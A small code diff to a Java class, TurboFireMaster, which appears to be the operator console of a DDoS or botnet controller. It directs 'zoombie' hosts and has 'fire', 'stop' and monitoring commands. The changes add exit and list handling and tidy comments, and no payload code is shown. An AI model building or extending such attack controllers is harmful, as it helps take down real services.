@@ -114,12 +114,12 @@ public class TurboFireMaster {
             this.gui.welcome("master", this.serverPort);
             String[] command = this.gui.getCommand();
             this.gui.clean();
-            
-            if(command[0].equalsIgnoreCase("stop")) {
-                System.out.println("teste");
+            if(command[0].equalsIgnoreCase("exit") || command[0].equalsIgnoreCase("quit")) {
+                System.exit(0);
+            }else if(command[0].equalsIgnoreCase("stop")) {
                 Thread t = new Thread(new StopCommandMasterThread(this.zoombieHosts, 4848));
                 t.start();
-            } else if(command[0].equalsIgnoreCase("monitoring")) {
+            }else if(command[0].equalsIgnoreCase("monitoring")) {
                 while(true) {
                     try {
                         TimeUnit.SECONDS.sleep(1);
@@ -132,8 +132,8 @@ public class TurboFireMaster {
                 this.gui.help();
                 this.gui.pressEnterToContinue();
             }else if(command[0].equals("list")) {
-            
-            }else if(command[0].equalsIgnoreCase("fire")) {
+                this.gui.showActiveZoombie(this.zoombieHosts);
+            }else if (command[0].equalsIgnoreCase("fire")) {
                 int port = 80;
                 int threadAmount = 1;
                 int connectionTimeOut = 300;
@@ -213,6 +213,7 @@ public class TurboFireMaster {
 
     /**
      * The server port state attribute accessor method.
+     * 
      * @return int An integer server port value.
      */
     public int getServerPort() {
@@ -221,6 +222,7 @@ public class TurboFireMaster {
 
     /**
      * The server address state attribute accessor method.
+     * 
      * @return InetAddress A object InetAddress with the server socket address.
      */
     public InetAddress getServerAddress() {
@@ -230,7 +232,7 @@ public class TurboFireMaster {
     /**
      * The attackLogs attribute state modifier method.
      * 
-     * @param AttackPattern A attackPattern object sended by response requisition.
+     * @param data A attackPattern object sended by response requisition.
      */
     public static void addAttackLog(AttackPattern data) {
         attackLogs.add(data);
